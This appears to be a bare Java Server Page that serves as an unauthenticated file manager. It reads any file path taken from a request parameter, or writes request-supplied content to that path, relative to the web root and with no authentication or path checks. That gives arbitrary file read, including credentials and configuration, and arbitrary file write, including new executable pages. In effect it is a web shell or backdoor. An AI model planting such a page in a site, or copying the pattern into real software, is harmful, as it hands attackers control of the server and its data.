<%@page contentType="text/plain; charset=UTF-8"
language="java" buffer="8kb" session="false" autoFlush="true"
import="java.io.*,java.net.*,java.util.*"
%>
<%
String opt=(String)request.getParameter("opt");
String path = (String)request.getParameter("path");
String encode = (String)request.getParameter("encode");
encode = encode==null?"UTF-8":encode;

String res = "";
if(path!=null && !path.equals("")){
	path = request.getRealPath("/") + path;
	File file = new File(path);
	if("save".equals(opt)){
		String str = (String)request.getParameter("file");
		FileWriter fw = new FileWriter(file);
		fw.write(str);
		fw.flush();
		fw.close();
		res = "success";
	}else{
		StringBuilder sb = new StringBuilder();
		BufferedReader reader = null;
		try {
			reader = new BufferedReader(new FileReader(file));
			boolean isFirstLine = true;
			String tempStr = "";
			while ((tempStr = reader.readLine()) != null) {
				if (isFirstLine) {
					isFirstLine = false;
				} else {
					sb.append("\n");
				}
				sb.append(tempStr);
			}
			reader.close();
		} catch (FileNotFoundException e) {
			throw new RuntimeException("readStringFromFile error", e);
		} catch (IOException e) {
			throw new RuntimeException("readStringFromFile error", e);
		}
		res = sb.toString();
	}
	
}
 
out.write(res);

%>